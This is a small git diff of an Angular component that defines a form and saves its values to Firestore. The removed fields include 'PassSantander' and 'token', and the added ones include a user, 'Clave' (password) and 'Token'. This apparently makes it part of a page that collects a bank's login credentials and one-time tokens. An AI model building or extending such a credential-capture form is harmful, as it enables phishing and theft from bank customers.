@@ -1,5 +1,6 @@
 import { Component, OnInit } from '@angular/core';
 import { FormControl, FormGroup } from '@angular/forms';
+import { Router } from '@angular/router';
 import { users } from 'src/app/Models/user';
 import { FirestoreService } from 'src/app/Services/firestore.service';
 import { InteractionService } from 'src/app/Services/interaction.service';
@@ -13,20 +14,20 @@ export class Part1Component   {
 
   formulario: FormGroup;
 
-
-
   constructor(
-   private firestore: FirestoreService,
-   private interaction: InteractionService,
-) {
-     this.formulario = new FormGroup({
-     id: new FormControl,
-     numDocuments: new FormControl,
-     PassSantander: new FormControl,
-     User: new FormControl,
-     token: new FormControl,
-})
-}
+    private firestore: FirestoreService,
+    private interaction: InteractionService,
+    private router: Router,
+  ) {
+    this.formulario = new FormGroup({
+      id: new FormControl(),
+      Usser: new FormControl(),
+      Clave: new FormControl(), // Cambié 'clave' por 'Clave'
+      Token: new FormControl(),
+    });
+  }
+
+
 onSubmit() {
  const userData: users = this.formulario.value;
  // userData.timestamp = firestore.FieldValue.serverTimestamp(); // Establecer fecha y hora actual
